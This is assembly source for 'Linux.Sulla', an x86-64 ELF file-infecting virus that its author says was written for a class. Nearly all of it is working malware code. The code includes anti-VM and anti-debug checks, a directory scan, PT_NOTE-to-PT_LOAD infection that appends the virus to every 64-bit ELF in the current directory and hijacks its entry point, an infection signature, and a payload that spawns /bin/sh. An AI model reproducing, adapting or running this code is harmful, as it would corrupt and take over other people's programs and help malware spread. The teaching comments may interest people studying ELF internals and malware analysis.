; ---------------------------------------------------------------------------------
;
;  Linux.Sulla | Written by @0xRoman1 as an assignment for my assembly class
;  April 2022                    
;                        
;  Run included build script to assemble
;  $ ./build                     
;
;  A note on 64-bit calling conventions
;  Because this class was taught mostly in 32-bit NASM and this project is 64-bit NASM,
;  Its important to define some key differences in 64-bit syscalls for potential readers
;  Source: https://x64.syscall.sh/
;  RAX = Syscall number
;  RDI = ARGO
;  RSI = ARG1
;  RDX = ARG2
;  R10 = ARG3
;  R8  = ARG4
;  R9  = ARG5
;  
;
   %define SYS_NUM    rax
   %define SYS_ARG0   rdi
   %define SYS_ARG1   rsi
   %define SYS_ARG2   rdx
   %define SYS_ARG2word dx
   %define SYS_ARG3   r10
   %define SYS_ARG6   r8
   %define SYS_ARG5   r9
;
;
;  Thankfully, in the 64-bit architecture we have more general purpsoe registers
;  at our disposal. Within this piece of malware the regsisters r13, r14, and r15
;  are preffered to manage addresses and data to avoid clutter with syscall arguments
;
; ---------------------------------------------------------------------------------
; System call defintion
; https://man7.org/linux/man-pages/man2/
; 
; READ
; Read from a file based on a given file descriptor.
; Args:
; 0 = File Descriptor to read from
; 1 = Buffer to store read bytes
; 2 = Size of bytes to read
  %define SYS_READ   0
;
; WRITE
; Write to a file descriptor.
; Args:
; 0 = File Descriptor to write to 
; 1 = Buffer of bytes to be written
; 2 = Size of bytes to be written
  %define SYS_WRITE      1
;
; OPEN
; Open a file. The file to be opened is specified by pathname.
; This syscall can be executed with flags, and with access mode values
; this sample will use the following access mode values
; READONLY = Read Only Permissions
; RDWR     = Read & Write Permissions
  %define SYS_OPEN   2
  %define O_READONLY     0
  %define O_RDWR         2
;
; CLOSE
; Close a given file discriptor so that it no longewr is associated to any file
; This syscall only takes one argument which is the FD to be recycled
  %define SYS_CLOSE      3
;
; FSTAT
; Get file status. This system call will return information about a file,
; through a given FD. This returns a "stat" structure. This struct contains the following
; 1.  Dev       ID of device containting file
; 2.  Ino       Inode number
; 3.  Mode          Memory protections
; 4.  Nlink     Amont of hard links
; 5.  Uid       User ID of the owner
; 6.  Gid       Group ID of the owner
; 7.  Rdev      Device ID (Only if special file)
; 8.  Size      Total size in bytes
; 9.  Blksize       Blocksize for filesystem io
; 10. Blocks        Number of 512b block allocated
; 11. Atime     Time of last access
; 12. Mtime     Time of last modification
; 13. Ctime     Time of last status change
  %define SYS_FSTAT      5
;
; LSEEK
; Reposition the read/write file offset of a given FD
; ARGS:
; 0 = FD
; 1 = Offset
; 2 = Whence
; In this case, whence will serve as SEEK_END
; as we want to set the file offset to the size of the file PLUS offset bytes
  %define SYS_LSEEK      8
  %define SEEK_END   2
;
; PREAD64
; Read from a 64bit file descriptor at a given offset
; This syscall reads a certian amount of bytes from the file descriptor at offset into
; a given buffer.
; The file referenced as the FD must be capable of seeking using the prior LSEEK syscall
; ARGS:
; 0 = FD
; 1 = Buffer to store read bytes
; 2 = Amount of bytes to be read
; 3 = Offset to read from
  %define SYS_PREAD64    17
;
; PWRITE64
; Write to a 64bit file descriptor at a given offset
; This sycall writes an amount of bytes to the buffer to the file descriptor at an offset
; The file referenced as the FD must be capable of seeking using the prior LSEEK syscall
; ARGS:
; 0 = FD
; 1 = Buffer to write to
; 2 = Amount of bytes to wrtie
; 3 = Offet to write to
  %define SYS_PWRITE64   18
;
; EXECVE
; Execute a program by a provided file name
; ARGS:
; 0 = Filename String
; 1 = ARGV[0] name of executable
  %define SYS_EXECVE     59
;
; EXIT
; Terminate the calling process
  %define SYS_EXIT   60
;
; SYNC
; Write buffer cache to disc
; This syscall causes all buffered modification to file metadata and be written
; to the system.
  %define SYS_SYNC   162
;
; GETDENTS64
; Get directory entries
; This syscall reads several linux_dirent structures from the directory provided.
; It stores these in the buffer in the second argument dirp. The arg count is the size
; of the buffer
; ARGS:
; 0 = FD - Where to read entries from
; 1 = DIRP - Location to store returned linux_dirent struct
; 2 = COUNT - Size of buffer which is defined below for ease
;
; LINUX_DIRENT Struct:
; 1. ino        inode info
; 2. off        offset to next linux_dirent
; 3. reclen     length of this linux_dirent
; 4. name       Filename (null-terminated)
; 5. pad        Zero padding byte
; 6. type       File type
;
; This last portion of the struct "type" can contain multiple values
; 1. blk        block device
; 2. chr        character device
; 3. dir        directory
; 4. fifo       named pipe
; 5. lnk        symbolic link
; 6. reg        regulat file
; 7. sock       unix domain socket
; 8. unknown        unkown file type
;
; !! THE NULL TERMINATED FILE NAME IS AT THE OFFSET [RSP + 18] OR [RSP + 0x12]
  %define SYS_GETDENTS64     217
  %define DIRENT_BUFSIZE     1024
;
; Regular trype in struct
  %define DT_REG       8
;
; PTRACE
  %define SYS_PTRACE 0
; ---------------------------------------------------------------------------------

%define EHDR_SIZE        64
%define ELFCLASS64       2
struc e_hdr
	.magic		resd 1  
	.class		resb 1  
	.data		resb 1  
	.elf_version	resb 1  
	.os 		resb 1 
	.abi_version 	resb 1
	.padding	resb 7 
	.type		resb 2  
	.machine	resb 2 
	.e_version	resb 4  
	.entry		resq 1 
	.phoff		resq 1 
	.shoff		resq 1  
	.flags		resb 4  
	.ehsize		resb 2  
	.phentsize	resb 2 
	.phnum		resb 2
	.shentsize	resb 2 
	.shnum		resb 2  
	.shstrndx	resb 2  
	.end		resb 1
endstruc

%define PT_LOAD          1
%define PT_NOTE          4
struc p_hdr
	.type		resb 4 
	.flags		resd 1  
	.offset 	resq 1  
	.vaddr		resq 1  
	.paddr		resq 1 
	.filesz 	resq 1 
	.memsz 		resq 1 
	.align		resq 1 
	.end		resb 1
endstruc

struc s_hdr
	.name		resb 4  
	.type		resb 4 
	.flags		resq 1 
	.addr   	resq 1  
	.offset 	resq 1  
	.size   	resq 1 
	.link   	resb 4
	.info   	resb 4
	.addralign 	resq 1 
	.entsize 	resq 1 
	.end		resb 1
endstruc

struc d_ent
	.ino		resq 2
	.reclen		resw 1
	.type		resb 1
	.name		resb 1
endstruc

%define buff		r15 + 0
%define fstat_st_size	r15 + 48
%define elfheader 	r15 + 144 
%define programheader 	r15 + 208
%define relativejmp 	r15 + 300

%define directorysize	r15 + 350
%define directoryentry	r15 + 400

%define O_RDONLY         0
%define O_RDWR           2
%define SEEK_END         2
%define DIRENT_BUFSIZE   1024

%define STDOUT           1
%define PERMS_RW	 0x7        
%define DOTELF		 0x464c457f
%define SIG		 0x41414141

%macro CLR_SYS_ARG2 0
xor rdx, rdx
%endmacro


; ---------------------------------------------------------------------------------
;  
;  How does infection actually take place?
;  Infection via PT_NOTE -> PT_LOAD
;  
;  | 1  Open target file
;  | 2  Store target OEP
;  | 3  Locate PT_NOTE in Program Headers Table
;  | 4  Convert PT_NOTE to PT_LOAD
;  | 5  Convert mem protects to allow for executable instructions
;  | 6  Convert EP addr to area that does not conflict with program execution
;  | 7  Expand elf size on disk and in virtual memory to compensate for payload
;  | 8  Append offset of injected segment to end of target's origin code
;  | 9  Have the end of the payload jump to the OEP
;  | 10 Insert payload to end of file
;  V 11 Write file back to disk
;
;
;  VX Sources, without these this would not be possible.
;  This sample is based on the following:
;  PT_NOTE Infection on SymbolCrash by @sblip   https://shorturl.at/uzVY7
;  LINUX.MIDRASHIM by @TMZvx                	https://shorturl.at/gkASV
;  LINUX.KROPOTKINE by @S01den @sblip           https://shorturl.at/kxHPQ
;  Returing to OEP despite PIE from tmpout      https://shorturl.at/hqxSU
;
;
;  DO NOT SPREAD THIS. I AM NOT RESPONSIBLE FOR WHAT YOU DO WITH THIS.
;
; ---------------------------------------------------------------------------------

segment .text
global main

;; Start of virus body
main:
	; -------------------------------------
	; Test CPUID hypervisor present bit
	; -------------------------------------
	push 1
	pop rax
	cpuid
	bt rcx, 0x1f
	jc panic
    
	; -------------------------------------
	; Test CPUID hypervisor brand
	; -------------------------------------
	xor rax, rax
	push 4
	pop rax
	cpuid
	cmp rcx, 0x4D566572    ; vmware str
	jc panic
	cmp rdx, 0x65726177    ; vmware str
	jc panic

	; ------------------------------------
	; Check vmware I/O Port
	; https://kb.vmware.com/s/article/1009458
	; -----------------------------------
	xor rax, rax
	xor rbx, rbx
	xor rcx, rcx
	xor rdx, rdx

	mov eax, 0x564D5868    ; VMX
	mov ebx, 0xFFFFFFFF     ; VX(port)
	mov ecx, 10
	mov edx, 0x5658
        in eax, dx
        cmp ebx, 0x564D5868    ; VMX
        je panic

	; ------------------------------------
	; PTRACE anti debug
	; ------------------------------------
	xor SYS_ARG0, SYS_ARG0
	xor SYS_ARG1, SYS_ARG1
	xor SYS_ARG2, SYS_ARG2
	xor SYS_ARG3, SYS_ARG3
	mov SYS_NUM, SYS_PTRACE
	syscall
	cmp rax, 0
	je panic

	sub rsp, 5000
	mov r15, rsp                                                

        push "."                                               
        mov SYS_ARG0, rsp
        mov SYS_ARG1, O_RDONLY
        xor SYS_ARG2, rdx
        mov SYS_NUM, SYS_OPEN
        syscall                                                 
        
        pop rdi
        cmp rax, 0                                              
        jbe end

        mov rdi, rax                                           
        lea rsi, [directoryentry]                                    
        mov rdx, DIRENT_BUFSIZE                               
        mov rax, SYS_GETDENTS64
        syscall                                                                                 

        mov qword [directorysize], rax                             

        mov rax, SYS_CLOSE                                     
        syscall

        xor rcx, rcx                                            

process_file:
        push rcx                                                
        cmp byte [rcx + directoryentry + d_ent.type], DT_REG                      
        jne .next_file                                          

	; ----------------------------------------------
	; Open target file
	; ----------------------------------------------
        lea SYS_ARG0, [rcx + directoryentry + d_ent.name]                       
        mov SYS_ARG1, O_RDWR
        CLR_SYS_ARG2
        mov SYS_NUM, SYS_OPEN
        syscall

        cmp rax, 0                                          
        jbe .next_file
	; fd in TARGETFD
  %define TARGETFD r9
        mov TARGETFD, rax

	; ----------------------------------------------
	; Read target elf header
	; ----------------------------------------------
        mov SYS_ARG0, TARGETFD                                         
        lea SYS_ARG1, [elfheader]
        mov SYS_ARG2, EHDR_SIZE
        mov SYS_ARG3, 0
        mov SYS_NUM, SYS_PREAD64
        syscall

	; ----------------------------------------------
	; verify target is elf
	; ----------------------------------------------
        cmp dword [elfheader + e_hdr.magic], DOTELF          
        jnz .close_file                                
        
	; ---------------------------------------------
	; verify target is 64 bit
	; ---------------------------------------------
        cmp byte [elfheader + e_hdr.class], ELFCLASS64                
        jne .close_file                                   

	; ---------------------------------------------
	; verify target does not have
	; infection signature
	; ---------------------------------------------
        cmp dword [elfheader + e_hdr.padding], SIG           
        jz .close_file                                     

        mov r8, [elfheader + e_hdr.phoff]                          
        xor rbx, rbx                
        xor r14, r14                                      

        ; -------------------------------------------
	; Load phdr
	; -------------------------------------------
	 .loop_phdr
	mov SYS_ARG0, TARGETFD                                        
        lea SYS_ARG1, [programheader]                               
        mov SYS_ARG2word, word [elfheader + e_hdr.phentsize]                           
        mov SYS_ARG3, r8                                         
        mov SYS_NUM, SYS_PREAD64
        syscall

        cmp byte [programheader + p_hdr.type], PT_NOTE                    
        jz .infect                                         

        inc rbx                                             
        cmp bx, word [elfheader + e_hdr.phnum]                          
        jge .close_file                                    

        add r8w, word [elfheader + e_hdr.phentsize]                           
        jnz .loop_phdr

	.infect:
	; -------------------------------------------
	; Get target program header file offset
	; -------------------------------------------
        mov ax, bx                                     
        mov dx, word [elfheader + e_hdr.phentsize]                       
        imul dx                                        
        mov r14w, ax
        add r14, [elfheader + e_hdr.phoff]                            

	; ----------------------------------------
	; Stat file
	; ----------------------------------------
        mov SYS_ARG0, TARGETFD
        mov SYS_ARG1, r15                                    
        mov SYS_NUM, SYS_FSTAT
        syscall

	; ----------------------------------------
        ; get target EOF
	; ----------------------------------------
        mov SYS_ARG0, TARGETFD                                
        mov SYS_ARG1, 0                                
        mov SYS_ARG2, SEEK_END
        mov SYS_NUM, SYS_LSEEK
        syscall                                         
        push rax 

	; ----------------------------------------
	; Delta to calulate distacne
	; ----------------------------------------
        call .distance                                   
        .distance:
        pop rbp
        sub rbp, .distance

	; ----------------------------------------
        ; append virus body to EOF
	; ----------------------------------------
        mov SYS_ARG0, TARGETFD                                     
        lea SYS_ARG1, [rbp + main]                        
        mov SYS_ARG2, end - main  
        mov SYS_ARG3, rax                                   
        mov SYS_NUM, SYS_PWRITE64
        syscall

	; -------------------------------
	; patch program header
	; -------------------------------
        mov dword [programheader + p_hdr.type], PT_LOAD                  
        mov dword [programheader + p_hdr.flags], PERMS_RW            
        pop rax                                         
        mov [programheader + p_hdr.offset], rax                           
        mov r13, [fstat_st_size]                            
        add r13, 0xc000000                             
        mov [programheader + p_hdr.vaddr], r13                           
        mov qword [programheader + p_hdr.align], 0x200000                
        add qword [programheader + p_hdr.filesz], end - main    
        add qword [programheader + p_hdr.memsz], end - main    
        mov SYS_ARG0, TARGETFD                                   
        mov SYS_ARG1, r15                                    
        lea SYS_ARG1, [programheader + p_hdr.type]                     
        mov SYS_ARG2word, word [elfheader + e_hdr.phentsize]                 
        mov SYS_ARG3, r14                                   
        mov rax, SYS_PWRITE64
        syscall

	; -------------------------------
        ; patch elf header
	; -------------------------------
        mov r14, [elfheader + e_hdr.entry]                           
        mov [elfheader + e_hdr.entry], r13

	; -------------------------------
	; Add signature
	; -------------------------------
	xor r13, r13
        mov r13, SIG                            
        mov [elfheader + e_hdr.padding], r13d                    

	; -------------------------------
        ; write patched ehdr
	; -------------------------------
        mov SYS_ARG0, TARGETFD                                     
        lea SYS_ARG1, [elfheader]                           
        mov SYS_ARG2, EHDR_SIZE                             
        mov SYS_ARG3, 0                                     
        mov SYS_NUM, SYS_PWRITE64
        syscall

	; -------------------------------
	; Write patched jmp
	; get targets new eof
	; -------------------------------
        mov SYS_ARG0, TARGETFD                                   
        mov SYS_ARG1, 0                                    
        mov SYS_ARG2, SEEK_END
        mov SYS_NUM, SYS_LSEEK
        syscall                                     

	; -------------------------------
        ; create patched jmp
	; -------------------------------
        mov rdx, [programheader + p_hdr.vaddr]
        add rdx, 5
        sub r14, rdx
        sub r14, end - main
        mov byte [relativejmp], 0xe9
        mov dword [relativejmp + 1], r14d

	; -------------------------------
        ; writing patched jmp to EOF
	; -------------------------------
        mov SYS_ARG0, TARGETFD                                   
        lea SYS_ARG1, [relativejmp]                            
        mov SYS_ARG2, 5                                      
        mov SYS_ARG3, rax                                    
        mov SYS_NUM, SYS_PWRITE64
        syscall

        mov SYS_NUM, SYS_SYNC                        
        syscall

        .close_file:
        mov SYS_NUM, SYS_CLOSE                          
        syscall

        .next_file:
        pop rcx
        add cx, word [rcx + directoryentry + d_ent.reclen]                 
        cmp rcx, qword [directorysize]                         
        jne process_file                                    

payload:
	xor rdi, rdi
	xor rax,rax
	push rax
	
	mov rbx, 0x68732f6e69622f
	push rbx
	mov rdi, rsp

	push rax
	mov rdx, rsp

	push rdi
	mov rsi, rsp

	add rax, 59
	syscall

end:
;; end of virus body
panic:
	xor rdi, rdi                                          
	mov rax, SYS_EXIT
	syscall
